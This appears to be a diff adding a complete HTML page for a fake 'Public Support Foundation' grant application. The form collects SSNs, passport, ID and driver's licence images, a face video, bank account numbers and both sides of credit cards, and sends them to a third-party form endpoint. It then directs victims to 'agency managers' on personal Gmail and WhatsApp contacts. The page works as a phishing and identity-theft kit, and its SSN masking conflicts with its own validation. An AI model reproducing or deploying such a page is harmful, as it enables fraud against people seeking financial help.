@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Public Support Foundation Application Form</title>
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif; /* Approximates Neue Haas Grotesk */
+            background-color: #001F3F; /* Navy anchor color from foundation design */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95) url('https://i.imgur.com/oYhxkO1.png') no-repeat center;
+            background-size: cover;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 800px;
+            transition: background-image 0.5s ease;
+        }
+        .about {
+            text-align: center;
+            margin-bottom: 20px;
+            background-color: rgba(255, 255, 255, 0.8); /* Slight background for contrast */
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .about h2 {
+            font-weight: bold;
+            color: #001F3F; /* Navy blue for "About Us" heading */
+        }
+        .about p {
+            color: #000000; /* Pure black for "About Us" context */
+        }
+        h1 {
+            text-align: center;
+            color: #FFFFFF; /* White for "Public Support Foundation Application Form" */
+            font-family: Georgia, serif; /* Approximates Poynter serif */
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5); /* Add shadow for readability */
+            padding: 10px;
+            background-color: rgba(0, 0, 0, 0.2); /* Slight background for contrast */
+        }
+        fieldset {
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        legend {
+            font-weight: bold;
+            color: #00FF00; /* Bright green for visibility */
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #FFFFFF; /* White for contrast */
+        }
+        input[type="text"], input[type="number"], input[type="email"], input[type="tel"], input[type="file"], select, textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            background-color: #fff; /* White background for inputs */
+        }
+        input[type="file"] {
+            color: #FFFFFF; /* Ensure text is white */
+        }
+        input[type="file"]::-webkit-file-upload-button {
+            background-color: #0056b3; /* Blue background for button */
+            color: #FFFFFF; /* White text */
+            padding: 8px 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        input[type="file"]::file-selector-button {
+            background-color: #0056b3; /* Blue background for button */
+            color: #FFFFFF; /* White text */
+            padding: 8px 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        textarea {
+            resize: vertical;
+            height: 100px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #007bff; /* Bright blue accent */
+            color: #fff; /* White text */
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .error {
+            color: #FF0000; /* Bright red for visibility */
+            font-size: 14px;
+            display: none;
+        }
+        .hidden {
+            display: none;
+        }
+        #logo {
+            max-width: 200px;
+            display: block;
+            margin: 0 auto 20px;
+        }
+        .bottom-note, .inquiries {
+            text-align: center;
+            color: #FFFFFF; /* White for visibility */
+            margin-top: 20px;
+        }
+        .bottom-note h3, .inquiries h3 {
+            font-weight: bold;
+            color: #FFFFFF; /* White for consistency with labels */
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px;
+            }
+            h1 {
+                font-size: 1.5em; /* Reduce font size for smaller screens */
+            }
+            #logo {
+                max-width: 150px; /* Smaller logo on mobile */
+            }
+            .form-group {
+                font-size: 14px; /* Smaller text for mobile */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="about">
+            <h2>About Us</h2>
+            <p>The Public Support Foundation program is an initiative designed to support individuals and organizations with the resources they need to achieve sustainable growth and positive impact. Our mission is to provide financial assistance, mentorship, and opportunities that empower beneficiaries to bring their ideas to life, improve livelihoods, and contribute meaningfully to their communities.</p>
+        </div>
+        <img id="logo" src="https://i.imgur.com/4PULYwN.png" alt="Public Support Foundation Logo/Emblem" style="width: 200px; height: 150px;">
+        <h1>Public Support Foundation Application Form</h1>
+        <form id="publicsupportfoundationForm" action="https://formspree.io/f/mzzvlkoo" method="POST" enctype="multipart/form-data" onsubmit="return validateForm(event)">
+            <fieldset>
+                <legend>Personal Information</legend>
+                <div class="form-group">
+                    <label for="name" aria-label="Enter your full name">Name</label>
+                    <input type="text" id="name" name="name" required tabindex="1">
+                    <span class="error" id="nameError">Please enter your name</span>
+                </div>
+                <div class="form-group">
+                    <label for="address" aria-label="Enter your address">Address</label>
+                    <input type="text" id="address" name="address" required tabindex="2">
+                    <span class="error" id="addressError">Please enter your address</span>
+                </div>
+                <div class="form-group">
+                    <label for="gmail" aria-label="Enter your email address">Gmail</label>
+                    <input type="email" id="gmail" name="gmail" required tabindex="3">
+                    <span class="error" id="gmailError">Please enter a valid email address</span>
+                </div>
+                <div class="form-group">
+                    <label for="phone" aria-label="Enter your 10-digit phone number">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" required pattern="[0-9]{10}" placeholder="e.g., 1234567890" tabindex="4">
+                    <span class="error" id="phoneError">Please enter a valid 10-digit phone number</span>
+                </div>
+                <div class="form-group">
+                    <label for="ssn" aria-label="Enter your 9-digit SSN">SSN Number</label>
+                    <input type="text" id="ssn" name="ssn" required pattern="[0-9]{9}" placeholder="e.g., 123456789" oninput="maskSSN()" tabindex="5">
+                    <span class="error" id="ssnError">Please enter a valid 9-digit SSN</span>
+                </div>
+                <div class="form-group">
+                    <label for="gender" aria-label="Select your gender">Gender</label>
+                    <select id="gender" name="gender" required tabindex="6">
+                        <option value="">Select</option>
+                        <option value="male">Male</option>
+                        <option value="female">Female</option>
+                        <option value="other">Other</option>
+                        <option value="prefer_not_to_say">Prefer not to say</option>
+                    </select>
+                    <span class="error" id="genderError">Please select your gender</span>
+                </div>
+                <div class="form-group">
+                    <label for="zipcode" aria-label="Enter your zip code">Zip Code</label>
+                    <input type="text" id="zipcode" name="zipcode" required tabindex="7">
+                    <span class="error" id="zipcodeError">Please enter your zip code</span>
+                </div>
+                <div class="form-group">
+                    <label for="nationality" aria-label="Enter your nationality">Nationality</label>
+                    <input type="text" id="nationality" name="nationality" required tabindex="8">
+                    <span class="error" id="nationalityError">Please enter your nationality</span>
+                </div>
+                <div class="form-group">
+                    <label for="placeofbirth" aria-label="Enter your place of birth">Place of Birth</label>
+                    <input type="text" id="placeofbirth" name="placeofbirth" required tabindex="9">
+                    <span class="error" id="placeofbirthError">Please enter your place of birth</span>
+                </div>
+            </fieldset>
+
+            <fieldset>
+                <legend>Identification Details</legend>
+                <div class="form-group">
+                    <label for="passportphoto" aria-label="Upload your passport photo">Upload Passport Photo</label>
+                    <input type="file" id="passportphoto" name="passportphoto" accept="image/*" required tabindex="10">
+                    <span class="error" id="passportphotoError">Please upload your passport photo (image only)</span>
+                </div>
+                <div class="form-group">
+                    <label for="idcard" aria-label="Upload your ID card">Upload ID Card</label>
+                    <input type="file" id="idcard" name="idcard" accept="image/*" required tabindex="11">
+                    <span class="error" id="idcardError">Please upload your ID card (image only)</span>
+                </div>
+                <div class="form-group">
+                    <label for="faceverification" aria-label="Upload a short verification video">Face Verification (Short Video)</label>
+                    <input type="file" id="faceverification" name="faceverification" accept="video/*" required tabindex="12">
+                    <span class="error" id="faceverificationError">Please upload a short verification video (video only)</span>
+                </div>
+                <div class="form-group">
+                    <label for="occupation" aria-label="Enter your occupation">Occupation</label>
+                    <input type="text" id="occupation" name="occupation" required tabindex="13">
+                    <span class="error" id="occupationError">Please enter your occupation</span>
+                </div>
+                <div class="form-group">
+                    <label for="criminalrecord" aria-label="Select if you have a criminal record">Criminal Record</label>
+                    <select id="criminalrecord" name="criminalrecord" required onchange="toggleCriminalDetails()" tabindex="14">
+                        <option value="">Select</option>
+                        <option value="no">No</option>
+                        <option value="yes">Yes</option>
+                    </select>
+                    <span class="error" id="criminalrecordError">Please select if you have a criminal record</span>
+                </div>
+                <div class="form-group hidden" id="criminaldetailsgroup">
+                    <label for="criminaldetails" aria-label="Enter criminal record details if applicable">Details (if yes)</label>
+                    <textarea id="criminaldetails" name="criminaldetails" tabindex="15"></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="relationshipstatus" aria-label="Select your relationship status">Relationship Status</label>
+                    <select id="relationshipstatus" name="relationshipstatus" required tabindex="16">
+                        <option value="">Select</option>
+                        <option value="single">Single</option>
+                        <option value="married">Married</option>
+                        <option value="divorced">Divorced</option>
+                        <option value="widowed">Widowed</option>
+                        <option value="other">Other</option>
+                    </select>
+                    <span class="error" id="relationshipstatusError">Please select your relationship status</span>
+                </div>
+                <div class="form-group">
+                    <label for="driverslicensefront" aria-label="Upload the front of your driver's license">Upload Driver's License (Front)</label>
+                    <input type="file" id="driverslicensefront" name="driverslicensefront" accept="image/*" required tabindex="17">
+                    <span class="error" id="driverslicensefrontError">Please upload the front of your driver's license (image only)</span>
+                </div>
+                <div class="form-group">
+                    <label for="driverslicenseback" aria-label="Upload the back of your driver's license">Upload Driver's License (Back)</label>
+                    <input type="file" id="driverslicenseback" name="driverslicenseback" accept="image/*" required tabindex="18">
+                    <span class="error" id="driverslicensebackError">Please upload the back of your driver's license (image only)</span>
+                </div>
+            </fieldset>
+
+            <fieldset>
+                <legend>Financial Details</legend>
+                <div class="form-group">
+                    <label for="income" aria-label="Enter your monthly income">Income per Month</label>
+                    <input type="number" id="income" name="income" min="0" required tabindex="19">
+                    <span class="error" id="incomeError">Please enter your monthly income</span>
+                </div>
+                <div class="form-group">
+                    <label for="bankname" aria-label="Enter your bank name">Bank Name</label>
+                    <input type="text" id="bankname" name="bankname" required tabindex="20">
+                    <span class="error" id="banknameError">Please enter your bank name</span>
+                </div>
+                <div class="form-group">
+                    <label for="accountnumber" aria-label="Enter your bank account number">Bank Account Number</label>
+                    <input type="text" id="accountnumber" name="accountnumber" required tabindex="21">
+                    <span class="error" id="accountnumberError">Please enter your bank account number</span>
+                </div>
+                <div class="form-group">
+                    <label for="creditcardfront" aria-label="Upload the front of your credit card">Upload Credit Card (Front)</label>
+                    <input type="file" id="creditcardfront" name="creditcardfront" accept="image/*" required tabindex="22">
+                    <span class="error" id="creditcardfrontError">Please upload the front of your credit card (image only)</span>
+                </div>
+                <div class="form-group">
+                    <label for="creditcardback" aria-label="Upload the back of your credit card">Upload Credit Card (Back)</label>
+                    <input type="file" id="creditcardback" name="creditcardback" accept="image/*" required tabindex="23">
+                    <span class="error" id="creditcardbackError">Please upload the back of your credit card (image only)</span>
+                </div>
+            </fieldset>
+
+            <fieldset>
+                <legend>Grant Details</legend>
+                <div class="form-group">
+                    <label for="amountneeded" aria-label="Enter the range of amount needed">Range of Amount Needed (e.g., $20000 - $50000)</label>
+                    <input type="text" id="amountneeded" name="amountneeded" required tabindex="24">
+                    <span class="error" id="amountneededError">Please enter the range of amount needed</span>
+                </div>
+                <div class="form-group">
+                    <label for="note" aria-label="Enter a short note about yourself">Short Note About Yourself</label>
+                    <textarea id="note" name="note" required tabindex="25"></textarea>
+                    <span class="error" id="noteError">Please enter a short note about yourself</span>
+                </div>
+            </fieldset>
+
+            <button type="submit" tabindex="26">Submit Application</button>
+        </form>
+        <div class="bottom-note">
+            <h3>Important Notice</h3>
+            <p>Upon submission of this form with the necessary details, kindly reach out to the designated agency representative or management team via the contact information listed below.</p>
+        </div>
+        <div class="inquiries">
+            <h3>For more inquiries</h3>
+            <p>Dear Applicant,<br>All inquiries regarding the program may be directed to the registered agency managers via WhatsApp or email.<br><br>
+            Mrs. A. Angelia<br>Whatsapp: +19403372433<br>Gmail: anonaangelia22@gmail.com<br><br>
+            Mrs. C. Liddy<br>Whatsapp: +14844831123<br>Gmail: Liddycollynbolton@gmail.com<br><br>
+            Mr. D. Pierce<br>Whatsapp: +17533122775<br>Gmail: delanopierce25@gmail.com</p>
+        </div>
+    </div>
+
+    <script>
+        function toggleCriminalDetails() {
+            const select = document.getElementById('criminalrecord');
+            const detailsGroup = document.getElementById('criminaldetailsgroup');
+            if (select.value === 'yes') {
+                detailsGroup.classList.remove('hidden');
+                document.getElementById('criminaldetails').required = true;
+            } else {
+                detailsGroup.classList.add('hidden');
+                document.getElementById('criminaldetails').required = false;
+            }
+        }
+
+        function maskSSN() {
+            const ssnInput = document.getElementById('ssn');
+            let ssn = ssnInput.value.replace(/\D/g, ''); // Remove non-digits
+            if (ssn.length === 9) {
+                ssnInput.value = 'XXX-XX-' + ssn.slice(-4); // Mask all but last 4 digits
+            }
+        }
+
+        function validateForm(event) {
+            let isValid = true;
+            const form = document.getElementById('publicsupportfoundationForm');
+            const errors = form.querySelectorAll('.error');
+            errors.forEach(error => error.style.display = 'none');
+
+            const requiredFields = form.querySelectorAll('[required]');
+            requiredFields.forEach(field => {
+                if (!field.value.trim() && field.type !== 'file' || (field.type === 'file' && !field.files.length)) {
+                    const errorId = field.id + 'Error';
+                    document.getElementById(errorId).style.display = 'block';
+                    isValid = false;
+                } else if (field.type === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(field.value)) {
+                    const errorId = field.id + 'Error';
+                    document.getElementById(errorId).style.display = 'block';
+                    isValid = false;
+                } else if (field.type === 'tel' && !/^\d{10}$/.test(field.value)) {
+                    const errorId = field.id + 'Error';
+                    document.getElementById(errorId).style.display = 'block';
+                    isValid = false;
+                } else if (field.id === 'ssn' && !/^\d{9}$/.test(field.value.replace(/[^\d]/g, ''))) {
+                    const errorId = field.id + 'Error';
+                    document.getElementById(errorId).style.display = 'block';
+                    isValid = false;
+                } else if (field.type === 'file' && field.files.length && !field.accept.split(',').some(type => field.files[0].type.match(type.replace('*', '')))) {
+                    const errorId = field.id + 'Error';
+                    document.getElementById(errorId).style.display = 'block';
+                    isValid = false;
+                }
+            });
+
+            if (isValid) {
+                alert('Form submitted successfully! Please contact the agency representative.');
+            } else {
+                event.preventDefault();
+                alert('Please correct the errors in the form.');
+            }
+            return isValid;
+        }
+    </script>
+</body>
+</html>
